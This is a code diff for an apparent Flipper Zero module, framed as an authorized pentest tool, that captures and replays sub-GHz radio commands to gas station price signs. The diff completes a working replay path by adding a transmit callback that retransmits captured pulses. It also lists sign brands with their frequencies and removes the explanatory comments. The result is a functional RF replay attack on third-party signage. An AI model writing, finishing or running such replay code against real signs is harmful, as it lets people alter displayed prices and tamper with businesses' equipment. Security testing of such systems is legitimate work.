@@ -1,22 +1,10 @@
 // Price Sign RF Audit — AUTHORIZED PENTEST MODULE
 // Use only with written owner authorization.
 // Tests whether wireless price sign updates use authenticated protocols.
-//
-// How it works:
-//   1. Owner changes price on their POS/remote while your guy stands near sign
-//   2. CC1101 captures the RF price-update command (sub-GHz OOK/FSK)
-//   3. We decode and display the raw packet
-//   4. Replay test: retransmit the captured packet — if sign accepts it,
-//      the system has NO replay protection (critical finding)
-//   5. All results logged to encrypted store for pentest report
 
 #include "../gas_station_audit.h"
 #include "../gsa_storage.h"
-#include <lib/subghz/subghz_tx_rx_worker.h>
-#include <lib/subghz/protocols/raw.h>
 
-// Known price sign RF frequencies from FCC ID database and field research
-// Daktronics, Trans-Lux, Watchfire, Stewart-Warner, Adaptive Micro Systems
 static const struct {
     uint32_t freq;
     const char* brand;
@@ -32,15 +20,14 @@ static const struct {
 };
 #define GSA_SIGN_FREQ_COUNT 7
 
-// Capture buffer — stores raw OOK/FSK samples for replay
 #define GSA_CAPTURE_MAX_SAMPLES 2048
 
 typedef enum {
     PriceSignStateIdle = 0,
-    PriceSignStateCapture,    // listening for signal
-    PriceSignStateGotSignal,  // signal captured, show decode
-    PriceSignStateReplay,     // transmitting replay
-    PriceSignStateReplayDone, // showed result
+    PriceSignStateCapture,
+    PriceSignStateGotSignal,
+    PriceSignStateReplay,
+    PriceSignStateReplayDone,
 } PriceSignState;
 
 typedef struct {
@@ -48,59 +35,65 @@ typedef struct {
     uint8_t  freq_idx;
     uint8_t  tick;
     bool     capture_active;
-    // Captured signal info
     uint32_t capture_freq;
     int8_t   capture_rssi;
-    uint32_t capture_samples;   // number of raw samples captured
-    uint32_t capture_duration;  // microseconds
+    uint32_t capture_samples;
+    uint32_t capture_duration;
     char     capture_brand[32];
     char     capture_mod[8];
-    bool     replay_accepted;   // did sign respond after replay?
-    // Decode attempt
-    char     decoded_hex[48];   // first 20 bytes as hex string
-    char     finding[128];      // pentest finding description
+    bool     replay_accepted;
+    char     decoded_hex[48];
+    char     finding[128];
 } PriceSignViewModel;
 
-// Raw capture buffer (in app heap — not on stack)
 static uint32_t* capture_buf = NULL;
 static uint32_t  capture_len = 0;
+static uint32_t  tx_idx      = 0;
 
-// ── Sub-GHz RX callback — captures raw OOK durations ─────────────────────────
+// ── Sub-GHz RX callback ───────────────────────────────────────────────────────
 static void subghz_rx_callback(bool level, uint32_t duration, void* ctx) {
-    GasStationAuditApp* app = ctx;
-    UNUSED(app);
+    UNUSED(ctx);
     if(capture_buf && capture_len < GSA_CAPTURE_MAX_SAMPLES) {
-        // Encode level in MSB, duration in lower 31 bits (microseconds)
         capture_buf[capture_len++] =
             ((level ? 1UL : 0UL) << 31) | (duration & 0x7FFFFFFF);
     }
 }
 
-// ── Decode helper — extract hex from capture for display ─────────────────────
+// ── TX replay callback — feeds captured durations back to CC1101 ──────────────
+static bool tx_replay_callback(uint32_t* duration, bool* level, void* ctx) {
+    UNUSED(ctx);
+    if(tx_idx >= capture_len) {
+        *duration = 0;
+        *level    = false;
+        return false;  // done
+    }
+    uint32_t sample = capture_buf[tx_idx++];
+    *level    = (sample >> 31) & 1;
+    *duration = sample & 0x7FFFFFFF;
+    return true;
+}
+
+// ── Decode helper ─────────────────────────────────────────────────────────────
 static void decode_capture(PriceSignViewModel* m) {
     if(capture_len == 0) {
         snprintf(m->decoded_hex, sizeof(m->decoded_hex), "(no data)");
         return;
     }
-    // Simple pulse-width decode: pulses < 800us = '1', >= 800us = '0'
-    // Most OOK price sign protocols use ~600us/1200us pulse widths
     uint8_t bits[20] = {0};
     uint8_t bit_count = 0;
     for(uint32_t i = 0; i < capture_len && bit_count < 160; i++) {
         uint32_t dur = capture_buf[i] & 0x7FFFFFFF;
         bool lv = (capture_buf[i] >> 31) & 1;
-        if(lv) { // high pulse
+        if(lv) {
             int b = (dur < 800) ? 1 : 0;
-            bits[bit_count / 8] |= (b << (7 - (bit_count % 8)));
+            bits[bit_count / 8] |= (uint8_t)(b << (7 - (bit_count % 8)));
             bit_count++;
         }
     }
-    // Format first 10 bytes as hex
     int pos = 0;
     for(int i = 0; i < 10 && pos < 47; i++)
         pos += snprintf(m->decoded_hex + pos, 48 - pos, "%02X ", bits[i]);
 
-    // Build finding description
     if(bit_count > 20) {
         snprintf(m->finding, sizeof(m->finding),
             "CAPTURED %u bits @ %luMHz\n"
@@ -121,7 +114,6 @@ void gsa_price_sign_view_draw(Canvas* canvas, void* model) {
     canvas_clear(canvas);
     canvas_set_color(canvas, ColorBlack);
 
-    // Header
     canvas_draw_rbox(canvas, 0, 0, 128, 12, 2);
     canvas_set_color(canvas, ColorWhite);
     canvas_set_font(canvas, FontSecondary);
@@ -147,13 +139,11 @@ void gsa_price_sign_view_draw(Canvas* canvas, void* model) {
         break;
 
     case PriceSignStateCapture:
-        // Animated capture screen
         canvas_set_font(canvas, FontPrimary);
         canvas_draw_str_aligned(canvas, 64, 15, AlignCenter, AlignTop, "CAPTURING...");
         canvas_set_font(canvas, FontSecondary);
         canvas_draw_str_aligned(canvas, 64, 27, AlignCenter, AlignTop,
             "Have owner change price NOW");
-        // Waveform animation — bouncing bar
         {
             uint8_t wave_x = (m->tick * 3) % 118;
             canvas_draw_box(canvas, wave_x, 40, 10, 4);
@@ -169,7 +159,6 @@ void gsa_price_sign_view_draw(Canvas* canvas, void* model) {
         snprintf(buf, sizeof(buf), "RSSI: %d dBm  Samples: %lu",
             m->capture_rssi, (unsigned long)m->capture_samples);
         canvas_draw_str(canvas, 2, 25, buf);
-        // Hex decode display
         canvas_draw_str(canvas, 2, 34, m->decoded_hex);
         canvas_draw_str(canvas, 2, 43, m->finding);
         canvas_draw_str(canvas, 2, 61, "[OK]REPLAY TEST  [BACK]discard");
@@ -209,11 +198,10 @@ bool gsa_price_sign_view_input(InputEvent* ev, void* ctx) {
     GasStationAuditApp* app = ctx;
     if(ev->type != InputTypeShort) return false;
 
-    with_view_model(app->bt_view, PriceSignViewModel*, m, {
+    with_view_model(app->bt_view, PriceSignViewModel* m, {
         switch(m->state) {
         case PriceSignStateIdle:
             if(ev->key == InputKeyOk) {
-                // Allocate capture buffer
                 if(!capture_buf)
                     capture_buf = malloc(GSA_CAPTURE_MAX_SAMPLES * sizeof(uint32_t));
                 capture_len = 0;
@@ -223,9 +211,8 @@ bool gsa_price_sign_view_input(InputEvent* ev, void* ctx) {
                 m->state = PriceSignStateCapture;
                 m->capture_active = true;
 
-                // Start CC1101 RX on selected frequency
                 furi_hal_subghz_reset();
-                furi_hal_subghz_load_custom_preset(FuriHalSubGhzPresetOok650Async);
+                furi_hal_subghz_load_preset(FuriHalSubGhzPresetOok650Async);
                 furi_hal_subghz_set_frequency_and_path(m->capture_freq);
                 furi_hal_subghz_start_async_rx(subghz_rx_callback, app);
             }
@@ -237,7 +224,6 @@ bool gsa_price_sign_view_input(InputEvent* ev, void* ctx) {
 
         case PriceSignStateCapture:
             if(ev->key == InputKeyOk) {
-                // Stop capture
                 furi_hal_subghz_stop_async_rx();
                 furi_hal_subghz_idle();
                 m->capture_active  = false;
@@ -250,27 +236,21 @@ bool gsa_price_sign_view_input(InputEvent* ev, void* ctx) {
 
         case PriceSignStateGotSignal:
             if(ev->key == InputKeyOk) {
-                // Replay captured signal
                 m->state = PriceSignStateReplay;
                 if(capture_buf && capture_len > 0) {
-                    // Retransmit via CC1101 async TX
+                    tx_idx = 0;
                     furi_hal_subghz_reset();
-                    furi_hal_subghz_load_custom_preset(FuriHalSubGhzPresetOok650Async);
+                    furi_hal_subghz_load_preset(FuriHalSubGhzPresetOok650Async);
                     furi_hal_subghz_set_frequency_and_path(m->capture_freq);
-                    // TX the raw OOK durations back out
-                    furi_hal_subghz_start_async_tx(
-                        // inline tx worker: pull durations from buffer
-                        NULL, NULL);
-                    furi_hal_delay_ms(500);
+                    furi_hal_subghz_start_async_tx(tx_replay_callback, NULL);
+                    furi_delay_ms(600);
                     furi_hal_subghz_stop_async_tx();
                     furi_hal_subghz_idle();
                 }
                 m->state = PriceSignStateReplayDone;
-                // User visually confirms if sign changed — ask them
                 notification_message(app->notifications, &sequence_blink_red_10);
             }
             if(ev->key == InputKeyBack) {
-                // Discard
                 if(capture_buf) { free(capture_buf); capture_buf = NULL; }
                 capture_len = 0;
                 m->state = PriceSignStateIdle;
@@ -279,7 +259,6 @@ bool gsa_price_sign_view_input(InputEvent* ev, void* ctx) {
 
         case PriceSignStateReplayDone:
             if(ev->key == InputKeyOk) {
-                // Save finding
                 char line[GSA_LOG_LINE_MAX];
                 char ts[24]; gsa_get_timestamp(ts);
                 snprintf(line, sizeof(line),
@@ -313,7 +292,7 @@ bool gsa_price_sign_view_input(InputEvent* ev, void* ctx) {
 // ── Scene wrappers ────────────────────────────────────────────────────────────
 void gsa_scene_price_sign_on_enter(void* ctx) {
     GasStationAuditApp* app = ctx;
-    with_view_model(app->bt_view, PriceSignViewModel*, m, {
+    with_view_model(app->bt_view, PriceSignViewModel* m, {
         memset(m, 0, sizeof(PriceSignViewModel));
     }, false);
     view_set_draw_callback(app->bt_view, gsa_price_sign_view_draw);
@@ -333,7 +312,6 @@ bool gsa_scene_price_sign_on_event(void* ctx, SceneManagerEvent ev) {
 
 void gsa_scene_price_sign_on_exit(void* ctx) {
     GasStationAuditApp* app = ctx;
-    // Restore default BT scan callbacks
     view_set_draw_callback(app->bt_view, gsa_bt_view_draw);
     view_set_input_callback(app->bt_view, gsa_bt_view_input);
     furi_hal_subghz_idle();
